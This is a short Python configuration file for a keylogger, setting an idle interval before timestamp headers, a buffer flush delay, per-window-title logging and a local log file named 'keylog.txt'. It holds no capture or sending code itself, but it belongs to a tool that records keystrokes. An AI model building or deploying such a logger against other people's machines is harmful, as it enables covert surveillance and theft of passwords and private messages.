"""
Configuration constants for the keylogger.
Modify these values to change behavior without touching main code.
"""

IDLE_TIME = 5           # Seconds of inactivity before logging timestamp header
FLUSH_DELAY = 3         # Seconds to delay before flushing buffer to file
PER_APP_LOGGING = True  # Whether to log active window titles per session
LOG_FILE = "keylog.txt" # Path to the log file
